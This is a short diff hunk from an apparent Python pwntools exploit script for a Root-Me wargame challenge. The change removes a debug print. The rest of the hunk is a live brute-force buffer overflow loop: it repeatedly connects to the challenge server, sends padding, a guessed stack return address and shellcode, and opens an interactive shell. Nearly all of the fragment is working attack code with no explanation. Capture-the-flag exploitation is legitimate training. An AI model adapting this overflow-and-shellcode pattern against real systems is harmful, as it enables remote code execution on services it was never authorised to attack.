@@ -26,7 +26,6 @@ stack = int(w.recvuntil("name")[14:18],16)
 
 # BufferOverflow Attack with Brute Force
 for i in range(0,0x100):
-	print i	
 	w = remote("challenge03.root-me.org",56565)
 	w.sendline("w"*0x14+p32(stack-i*4, endian='big')+"\x00"*0x30+shell)
 	w.interactive()
